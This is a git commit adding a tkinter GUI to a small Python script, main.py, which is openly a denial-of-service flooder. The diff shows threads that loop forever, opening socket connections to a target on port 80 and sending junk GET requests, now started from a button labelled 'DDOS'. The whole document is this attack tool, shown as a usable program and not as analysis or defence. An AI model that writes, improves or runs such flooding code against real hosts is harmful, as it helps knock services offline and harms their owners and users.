8fc5afd210b849476b1ac58740d0afb436a94dbc
gitn3xus <gitn3xus@users.noreply.github.com>
2019-02-06 00:19:03 +0100

    Added the tkinter part.

--- main.py
+++ main.py
@@ -1,7 +1,8 @@
 import socket
 from threading import Thread
-host = input("Enter a host: ")
-target = socket.gethostbyname(host)
+from tkinter import *
+host = "" #input("Enter a host: ")
+target = host #socket.gethostbyname(host)
 port = 80
 def ddos():
     while True:
@@ -9,12 +10,20 @@ def ddos():
             try:
                 mysocket.connect((target, port))
                 #random scheiß daten
-                mysocket.send(str.encode("GET " + "gitn3xus" + "HTTP/1.1 \r\n"))
-                mysocket.sendto(str.encode("GET " + "gitn3xus" + "HTTP/1.1 \r\n"), (target, port))
+                mysocket.send(str.encode("GET " + "button" + "HTTP/1.1 \r\n"))
+                mysocket.sendto(str.encode("GET " + "button" + "HTTP/1.1 \r\n"), (target, port))
             except socket.error:
                 print("error")
         mysocket.close()
-for i in range(4):
-    t = Thread(target=ddos)
-    t.start()
-
+def start():
+    for i in range(4):
+        t = Thread(target=ddos)
+        t.start()
+window = Tk()
+window.title("tkinter_ddos")
+window.minsize(width=400, height=300)
+dos_button = Button(window, text="DDOS", command=start)
+kill_button = Button(window, text="kill", command=quit)
+dos_button.pack()
+kill_button.pack()
+window.mainloop()
